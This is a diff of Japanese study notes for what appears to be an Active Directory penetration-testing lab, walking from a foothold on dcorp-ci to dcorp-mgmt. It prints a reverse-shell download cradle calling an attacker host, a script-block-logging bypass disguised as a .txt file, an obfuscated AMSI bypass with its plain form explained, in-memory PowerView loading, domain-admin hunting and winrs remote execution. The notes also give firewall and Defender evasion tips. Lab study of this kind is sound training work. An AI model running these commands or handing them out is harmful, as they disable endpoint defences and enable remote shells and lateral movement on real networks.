@@ -189,35 +189,51 @@ powershell.exe iex (iwr http://172.16.100.48/Invoke-PowerShellTcp.ps1 -UseBasicP
 # IPAddress: C2サーバー
 # Port: 443でHTTPSを偽装しFW回避
 ```
-・HFSを起動しダウンロードさせるファイルを準備
+・HFSを起動しダウンロードさせるファイル(Invoke-PowerShellTcp.ps1)を準備
 ・netcatで接続を待ち受け
+```bash
+
+```
 ・powershellでdcorp-ciセッションが確立される
 
 
 ## dcorp-ciからのdcorp-mgmtアクセス(P48)LO-7
 
 ```bash
-
-# 拡張ログ（P/S実行内容を記録する監査ログ）をバイパス(.ps1は検知されるので.txtとして検知回避する。中身はPowerShellスクリプトなのでIEXコマンドで読み込ませて実行する)。PowerShellの内部設定を管理しているメモリに直接アクセスしログ記録のフラグを書き換えている。
-iex (iwr http://172.16.100.48/sbloggingbypass.txt -UseBasicParsing)	
-
-# 次のコマンドはDefenderで検知ブロックされる(メモリ内実行)
+# Invoke-expressionでPowerView.ps1を実行する。（ただしDefenderでブロックされる）
 iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))	
-
 # 上記コマンドの解説
 # New-Object:　新しいオブジェクトを作るコマンド(後続のコマンドをインスタンス化)
 # Net.WebClient.DownloadString:　WebClient起動しURLから文字列を取得する(PowerViewの中身)
+```
+AMSI（Anti Malware Scan Interface）をバイパスするため次のどちらを行う。
 
+① 難読化したコマンド
+```bash
+S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 
-# 再度コマンド実行
+# 難読化前（元の動作）
+# [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+# 初期化チェックのフラグをTrueに強制→起動に失敗と判定→AMSIが一切動作しない
+```
+② 難読化したコマンドをテキストファイルにし実行
+```bash
+# 拡張ログ（P/S実行内容を記録する監査ログ）をバイパス(.ps1は検知されるので.txtとして検知回避する。中身はPowerShellスクリプトなのでIEXコマンドで読み込ませて実行する)。PowerShellの内部設定を管理しているメモリに直接アクセスしログ記録のフラグを書き換えている。
+iex (iwr http://172.16.100.48/sbloggingbypass.txt -UseBasicParsing)	
+```
+AMSIのバイパスが完完したら再再コマンドを実行
+```bash
 iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))
-
+```
+ドメイン管理者がいる端末を特定する。
+```bash
 # どの端末にDAがいるか調べるコマンド。数分かかる
 Find-DomainUserLocation		
 
 # winrsが有効か＆コマンド実行の可否を調べる
 winrs -r:dcorp-mgmt cmd /c "set computername && set username"	
 ```
+dcorp-mgmtにアクセス完了
 
 ## dcorp-mgmtからクレデンシャル窃取(P49)LO-7
 
